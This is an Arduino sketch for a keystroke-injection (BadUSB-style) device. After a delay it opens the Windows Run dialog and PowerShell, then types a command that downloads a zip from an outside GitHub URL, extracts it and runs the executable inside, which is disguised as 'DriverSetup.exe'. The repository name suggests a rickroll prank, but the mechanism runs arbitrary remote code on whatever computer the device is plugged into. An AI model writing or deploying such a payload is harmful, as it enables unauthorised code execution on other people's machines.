#include <Keyboard.h>

void setup() {
    pinMode(12, INPUT_PULLUP);
    pinMode(13, OUTPUT);
    Keyboard.begin();
    delay(8000);
    if (digitalRead(12)==HIGH) {
        digitalWrite(13, HIGH);
        delay(5000);
        //payload
        
        //open run
        Keyboard.press(KEY_LEFT_GUI);
        delay(100);
        Keyboard.press('r');
        delay(100);
        Keyboard.releaseAll();
        delay(900);
        
        //open powershell
        Keyboard.println("powershell");
        delay(900);

        Keyboard.print("cd .\\Desktop\\; wget ");
        delay(50);
        Keyboard.print("-OutFile");
        delay(50);
        Keyboard.println(" DriverSetup.zip https://github.com/iand5739/rickroll/blob/main/DriverSetup.zip?raw=true; tar -xf DriverSetup.zip; Start-Process .\\DriverSetup.exe; exit");

        //payload
        delay(1000);
        Keyboard.releaseAll();
        Keyboard.end();
        delay(1000);
        digitalWrite(13, LOW);
    }
}

void loop() {
    delay(100);
}
